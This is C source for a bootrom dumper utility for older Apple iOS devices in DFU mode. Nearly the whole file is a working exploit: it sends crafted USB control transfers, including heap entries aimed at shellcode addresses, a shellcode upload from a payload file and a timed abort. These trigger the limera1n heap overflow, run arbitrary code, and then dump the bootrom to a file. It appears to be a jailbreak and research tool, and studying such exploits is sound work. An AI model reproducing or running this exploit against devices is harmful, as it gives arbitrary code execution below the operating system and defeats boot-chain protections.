// Bootrom Dumper Utility
// (c) pod2g october 2010
// (c) x56   october 2013
//
// thanks to :
// - Chronic Dev Team for their support
// - geohot for limera1n

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <libusb-1.0/libusb.h>
#ifdef __APPLE__
#include "darwin_usb.h"
#endif

#define VENDOR_ID	0x05AC
#define WTF_MODE	0x1227
#define LOADADDR	0x84000000
#define BUF_SIZE	0x10000

#ifdef __APPLE__
	void dummy_callback() { }
#endif

typedef struct usb_device {
	struct libusb_device_handle *handle;
	struct libusb_device_descriptor desc;
} *usb_device_t;

// global context
struct libusb_context *context;

usb_device_t usb_init() {
	usb_device_t idevice = NULL;
	struct libusb_device **device_list;
	struct libusb_device_descriptor desc;
	struct libusb_device_handle *handle = NULL;

	int deviceCount = libusb_get_device_list(context, &device_list);
	
	int i;
	for (i = 0; i < deviceCount; i++) {
		struct libusb_device* device = device_list[i];
		libusb_get_device_descriptor(device, &desc);
		if (desc.idVendor == VENDOR_ID && desc.idProduct == WTF_MODE) {
			libusb_open(device, &handle);			
			break;
		}
	}
	
	libusb_free_device_list(device_list, 1);
	
	if(handle != NULL) {
		idevice = (usb_device_t)malloc(sizeof(struct usb_device));
		idevice->handle = handle;
		idevice->desc = desc;
	}
	return idevice;
}

void usb_close(usb_device_t device) {
	if(device == NULL) {
		return;
	}
	if(device->handle != NULL) {
		libusb_close(device->handle);
	}
	free(device);
}

void usb_deinit() {
	libusb_exit(NULL);
}

void get_status(struct libusb_device_handle *handle) {
	unsigned char status[6];
	int ret, i;
	ret = libusb_control_transfer(handle, 0xA1, 3, 0, 0, status, 6, 100);
}

void dfu_notify_upload_finshed(struct libusb_device_handle *handle) {
	int ret, i;
	ret = libusb_control_transfer(handle, 0x21, 1, 0, 0, 0, 0, 100);
	for (i=0; i<3; i++){
		get_status(handle);
	}
	libusb_reset_device(handle);
}

usb_device_t usb_wait_device_connection(usb_device_t device) {
        sleep(2);
        usb_close(device);
        return usb_init();
}

int readfile(char *filename, void* buffer, unsigned int skip) {
        FILE* file = fopen(filename, "rb");
        if (file == NULL) {
                printf("File %s not found.\n", filename);
                return 1;
        }
        fseek(file, 0, SEEK_END);
        int len = ftell(file);
        fseek(file, skip, SEEK_SET);
        fread(buffer, 1, len - skip, file);
        fclose(file);

	return len-skip;
}

int main(int argc, char *argv[]) {
	usb_device_t device = NULL;
	int c, i, ret;
	int s_flag = 0;	
	unsigned char data[0x800];
	unsigned char status[6];
	unsigned int cpid;
	unsigned int loadaddr_size;
	unsigned int stack_address;
	
	while((c = getopt(argc, argv, "s:")) != -1) {
		switch(c) {
			case 's':
				s_flag = 1;
				if(!strcmp("s5l8920", optarg)) {
					cpid = 8920;
					break;
				}
				else if(!strcmp("s5l8922", optarg)) {
					cpid = 8922;
					break;
				}
				else if(!strcmp("s5l8930", optarg)) {
					cpid = 8930;
					break;
				}
				// fallthrough - bad argument
			case '?':
				printf("Usage: bdu [ -s s5l8920|s5l8922|s5l8930 ]\n");
			default:
				return 1;
		}
	}
	if(s_flag != 1 && argc > 1) {
		printf("Usage: bdu [ -s s5l8920|s5l8922|s5l8930 ]\n");
		return 1;
	}

	printf("______ Bootrom Dumper Utility (BDU) 1.1 ______\n");
	printf("\n");
	printf("                        (c) pod2g october 2010\n");
	printf("                        (c) x56   october 2013\n");
	printf("\n");
	
	// 1. Initialisation of the USB connection with the device in DFU
	libusb_init(&context);
	//libusb_set_debug(NULL, 3);
	device = usb_init();
	if(device == NULL || device->handle == NULL) {
		printf("[X] Please connect your iDevice in _DFU_ mode.\n");
		return 1;
	}	
	
	// 2. Attempting to autodetect CPID if not set via command line
	if(s_flag == 0) {
		unsigned char serial[0x100];
		char *cpid_str;
		int ret;

		ret = libusb_get_string_descriptor_ascii(device->handle, device->desc.iSerialNumber, serial, sizeof(serial));
		if(ret < 0) {
			printf("[X] Error retrieving string descriptor\n");
			return 1;
		}
		
		cpid_str = strstr(serial, "CPID:");
		if(cpid_str == NULL) {
			printf("[X] Unable to determine chip ID, try specifying with -s\n");
			return 1;
		}
		sscanf(cpid_str, "CPID:%d", &cpid);
	}
	
	// 3. Setting exploit configuration
	if(cpid == 8920) {
		loadaddr_size = 0x24000;
		stack_address = 0x84033FA4;
	}
	else if(cpid == 8922) {
		loadaddr_size = 0x24000;
		stack_address = 0x84033F98;
	}
	else if(cpid == 8930) {
		loadaddr_size = 0x2C000;
		stack_address = 0x8403BF9C;
	}
	else {
		printf("[X] Unknown or unsupported device.\n");
		return 1;
	}
	printf("[.] Detected s5l%d device\n", cpid);
	
	// 4. Executing dump payload using geohot's limera1n
	printf("[.] Now executing arbitrary code using geohot's limera1n...\n");
	unsigned char buf[0x2C000]; // largest possible buffer
	memset(buf, 0, sizeof(buf));
	unsigned int shellcode[0x800];
	unsigned int shellcode_address = LOADADDR + loadaddr_size - 0x1000 + 1;
	unsigned int shellcode_length = readfile("payload.bin", shellcode, 0);
	memset(buf, 0xCC, 0x800);
	for(i=0;i<0x800;i+=0x40) {
 		unsigned int* heap = (unsigned int*)(buf+i);
		heap[0] = 0x405;
		heap[1] = 0x101;
		heap[2] = shellcode_address;
		heap[3] = stack_address;
	}
	printf("sent data to copy: %X\n", libusb_control_transfer(device->handle, 0x21, 1, 0, 0, buf, 0x800, 1000));
	memset(buf, 0xCC, 0x800);
	for(i = 0; i < (loadaddr_size - 0x1800); i += 0x800) {
		libusb_control_transfer(device->handle, 0x21, 1, 0, 0, buf, 0x800, 1000);
	}
	printf("padded to 0x%X\n", LOADADDR + loadaddr_size - 0x1000);
	printf("sent shellcode: %X has real length %X\n", libusb_control_transfer(device->handle, 0x21, 1, 0, 0, (unsigned char*) shellcode, 0x800, 1000), shellcode_length);
	memset(buf, 0xBB, 0x800);
	printf("never freed: %X\n", libusb_control_transfer(device->handle, 0xA1, 1, 0, 0, buf, 0x800, 1000));
	
	#ifndef __APPLE__
	printf("sent fake data to timeout: %X\n", libusb_control_transfer(device->handle, 0x21, 1, 0, 0, buf, 0x800, 10));
	#else
	// pod2g: dirty hack for limera1n support.
	IOReturn kresult;
	IOUSBDevRequest req;
	bzero(&req, sizeof(req));
	//struct darwin_device_handle_priv *priv = (struct darwin_device_handle_priv *)client->handle->os_priv;
	struct darwin_device_priv *dpriv = (struct darwin_device_priv *)device->handle->dev->os_priv;
	req.bmRequestType     = 0x21;
	req.bRequest          = 1;
	req.wValue            = OSSwapLittleToHostInt16 (0);
	req.wIndex            = OSSwapLittleToHostInt16 (0);
	req.wLength           = OSSwapLittleToHostInt16 (0x800);
	req.pData             = buf + LIBUSB_CONTROL_SETUP_SIZE;
	kresult = (*(dpriv->device))->DeviceRequestAsync(dpriv->device, &req, (IOAsyncCallback1) dummy_callback, NULL);
	usleep(5 * 1000);
	kresult = (*(dpriv->device))->USBDeviceAbortPipeZero (dpriv->device);
	#endif
	
	printf("sent exploit to heap overflow: %X\n", libusb_control_transfer(device->handle, 0x21, 2, 0, 0, buf, 0, 1000));
	libusb_reset_device(device->handle);
	dfu_notify_upload_finshed(device->handle);
	libusb_reset_device(device->handle);
	printf("[.] Dump payload started.\n");

	// 5. bootrom dump by communicating with the payload
	printf("[.] Now dumping bootrom to file bootrom.bin...\n");
	device = usb_wait_device_connection(device);
        if (device == NULL || device->handle == NULL) {
                printf("[X] device stalled.\n");
		usb_close(device);
		usb_deinit();
                return 1;
        }
	FILE * fOut = fopen("bootrom.bin", "wb");
	unsigned int addr = 0x0;
	do {
		ret = libusb_control_transfer(device->handle, 0xA1, 2, 0, 0, data, 0x800, 100);
		if (ret < 0) break;
		fwrite(data, 1, 0x800, fOut);
		addr += 0x800;
	} while (addr < 0x10000);
        fclose(fOut);
	printf("[.] Done. Goodbye!\n");

	usb_close(device);
	usb_deinit();
	
	return 0;
}

